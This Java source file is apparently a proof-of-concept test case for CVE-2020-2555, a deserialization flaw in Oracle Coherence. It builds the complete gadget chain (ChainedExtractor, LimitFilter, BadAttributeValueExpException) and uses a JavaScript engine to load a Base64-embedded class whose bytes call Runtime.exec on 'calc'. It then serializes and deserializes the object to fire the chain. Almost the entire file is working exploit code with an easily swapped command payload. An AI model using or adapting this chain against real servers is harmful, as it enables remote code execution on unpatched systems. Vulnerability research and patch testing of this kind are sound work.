package com.feihong.testcase;

import com.feihong.utils.ClassFiles;
import com.feihong.utils.Util;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import org.apache.shiro.codec.Base64;
import javax.management.BadAttributeValueExpException;
import javax.script.ScriptEngineManager;
import java.lang.reflect.Field;

public class TestScriptEngineAdvancedWithCVE_2020_2555 {
    public static void main(String args[]) throws Exception {
//        byte[] bytes = ClassFiles.classAsBytes(BasicCmdTemplate.class);
//        String classCode = Base64.encodeToString(bytes);


        String classCode = "yv66vgAAADIAHwoABgASCgATABQIABUKABMAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAnTGNvbS9mZWlob25nL3RlbXBsYXRlL0Jhc2ljQ21kVGVtcGxhdGU7AQAKRXhjZXB0aW9ucwcAGQEAClNvdXJjZUZpbGUBABVCYXNpY0NtZFRlbXBsYXRlLmphdmEMAAcACAcAGgwAGwAcAQAEY2FsYwwAHQAeAQAlY29tL2ZlaWhvbmcvdGVtcGxhdGUvQmFzaWNDbWRUZW1wbGF0ZQEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAQABAAcACAACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAAAYABAAHAA0ACAALAAAADAABAAAADgAMAA0AAAAOAAAABAABAA8AAQAQAAAAAgAR";

        String code = "var bytes = org.apache.shiro.codec.Base64.decode('" + classCode + "');\n" +
                "        var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "        try{\n" +
                "            var clazz = classLoader.loadClass('BasicCmdTemplate');\n" +
                "            clazz.newInstance();\n" +
                "        }catch(err){\n" +
                "            var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "            method.setAccessible(true);\n" +
                "            var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "            clazz.newInstance();\n" +
                "        }";

        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getConstructor",
                new Object[]{new Class[0]}
        );

        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "newInstance",
                new Object[]{new Object[0]}
        );

        ReflectionExtractor extractor3 = new ReflectionExtractor(
                "getEngineByName",
                new Object[]{"javascript"}
        );

        ReflectionExtractor extractor4 = new ReflectionExtractor(
                "eval",
                new Object[]{code}
        );

        ReflectionExtractor[] extractors = {
                extractor1,
                extractor2,
                extractor3,
                extractor4
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
        LimitFilter limitFilter = new LimitFilter();

        //m_comparator
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);

        //m_oAnchorTop
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, ScriptEngineManager.class);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, limitFilter);

        //序列化
        byte[] finalBytes = Util.serialize(badAttributeValueExpException);

        //反序列化
        Util.deserialize(finalBytes);
    }
}
